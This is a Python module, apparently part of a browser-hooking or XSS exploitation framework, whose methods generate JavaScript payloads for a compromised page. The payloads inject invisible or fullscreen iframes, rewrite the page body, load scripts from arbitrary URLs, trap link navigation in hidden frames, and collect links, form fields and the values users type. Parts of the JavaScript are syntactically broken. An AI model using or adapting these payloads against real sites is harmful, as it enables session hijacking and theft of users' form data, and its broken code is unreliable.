from core.base.base_module import BaseModule
from core.utils.printer import *

class Js(BaseModule):
    """ Js module """
    
    def create_invisible_iframe(self, src):
        """ Create invisible iframe """
        iframe = f"<iframe  src='{src}' name='hiddenFrame' width: '1px' height: '1px' style='display:none'></iframe>"
        return iframe

    def create_fullscreen_iframe(self, src):
        """ Create fullscreen iframe """
        self.send_js("document.body.style.padding = '0px';document.body.style.margin = '0px';")
        iframe = f"<iframe  src='{src}' name='hiddenFrame' style='border:none;background-color:white;width:100%;height:100%;position:absolute;'></iframe>"
        return iframe		

    def replaceChild(self, data):
        """ Replace child """
        code = f'document.body.innerHTML = "{data}";'
        return code

    def appendChild(self, data):
        """ Append child """
        code = f'document.body.innerHTML += "{data}";'
        return code
    
    def send_html(self, data):
        """ Send html """
        lib = """
            var setInnerHTML = function(elm, html) {
            elm.innerHTML = html;
            Array.from(elm.querySelectorAll("script")).forEach(oldScript => {
                const newScript = document.createElement("script");
                Array.from(oldScript.attributes)
                .forEach(attr => newScript.setAttribute(attr.name, attr.value));
                newScript.appendChild(document.createTextNode(oldScript.innerHTML));
                oldScript.parentNode.replaceChild(newScript, oldScript);
            });
            }"""
        
        lib += f"setInnerHTML(document.body, {data});"
        return lib

    def load_script(self, url):
        """ Load script from url """
        data = f"""var s = document.createElement('script');
                s.type = 'text/javascript';
                s.src = '{url}';
                document.body.appendChild(s);"""
        return data
    
    def load_css(self, url):
        """ Load css from url """
        data = f"""var s = document.createElement('link');
                s.rel = 'stylesheet';
                s.type = 'text/css';
                s.href = '{url}';
                document.body.appendChild(s);"""
        return data
        
    def get_links(self):
        """ Get links from page """
        data = """var linkarray = [];
                var links = document.links;
                for (var i = 0; i < links.length; i++) {
                    linkarray.push(links[i].href);
                }		
                return linkarray;"""	
        return data

    def persistent_iframe(self):
        """ Create persistent iframe """
        data = """$('a').click(function(e) {
                if $(this).attr('href') != '' {
                    e.preventDefault();
                    var iframe = document.createElement('iframe');
                    iframe.src = $(this).attr('href');
                    iframe.style.display = 'none';	
                    document.body.appendChild(iframe);
                }"""
        return data
    
    def get_forms(self):
        """ Get forms from page """
        data = """var formarray = [];
                var forms = document.forms;
                for (var i = 0; i < forms.length; i++) {
                    formarray.push(forms[i].action);
                }
                return formarray;"""
        return data
    
    def get_form_inputs(self):
        """ Get form inputs from page """
        data = """var formarray = [];
                var forms = document.forms;
                for (var i = 0; i < forms.length; i++) {
                    var inputs = forms[i].elements;
                    for (var j = 0; j < inputs.length; j++) {
                        formarray.push(inputs[j].name);
                    }
                }
                return formarray;"""
        return data
    
    def get_form_inputs_value(self):
        """ Get form inputs value from page """
        data = """var formarray = [];
                var forms = document.forms;
                for (var i = 0; i < forms.length; i++) {
                    var inputs = forms[i].elements;
                    for (var j = 0; j < inputs.length; j++) {
                        formarray.push(inputs[j].value);
                    }
                }
                return formarray;"""
        return data